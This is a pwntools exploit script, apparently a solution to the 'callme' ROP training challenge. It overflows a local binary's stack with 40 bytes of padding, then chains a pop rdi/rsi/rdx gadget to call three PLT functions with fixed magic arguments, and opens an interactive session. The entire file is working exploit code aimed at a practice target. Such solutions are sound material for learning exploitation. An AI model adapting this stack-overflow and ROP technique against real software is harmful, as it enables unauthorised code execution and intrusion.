import pwn
import sys
import time

elf = pwn.context.binary = pwn.ELF('./callme')
io = elf.process()
#pwn.gdb.attach(io)
#time.sleep(3)
#Call me Addr
cOneAddr = elf.plt['callme_one']
cTwoAddr = elf.plt['callme_two']
cThreeAddr = elf.plt['callme_three']
#Gadgets
retAddr = 0x4006be
popGadget = 0x40093c #pop rdi; pop rsi; pop rdx; ret
offset = 40
payload = b"".join(
    [
        b'A' * offset,
        pwn.p64(retAddr),
        #Pattern is pop rdi, value, call function
        pwn.p64(popGadget),
        pwn.p64(0xdeadbeefdeadbeef),
        pwn.p64(0xcafebabecafebabe),
        pwn.p64(0xd00df00dd00df00d),
        pwn.p64(cOneAddr),
        pwn.p64(popGadget),
        pwn.p64(0xdeadbeefdeadbeef),
        pwn.p64(0xcafebabecafebabe),
        pwn.p64(0xd00df00dd00df00d),
        pwn.p64(cTwoAddr),
        pwn.p64(popGadget),
        pwn.p64(0xdeadbeefdeadbeef),
        pwn.p64(0xcafebabecafebabe),
        pwn.p64(0xd00df00dd00df00d),
        pwn.p64(cThreeAddr)
    ]
)

io.recv(1000)
io.sendline(payload)
io.interactive()
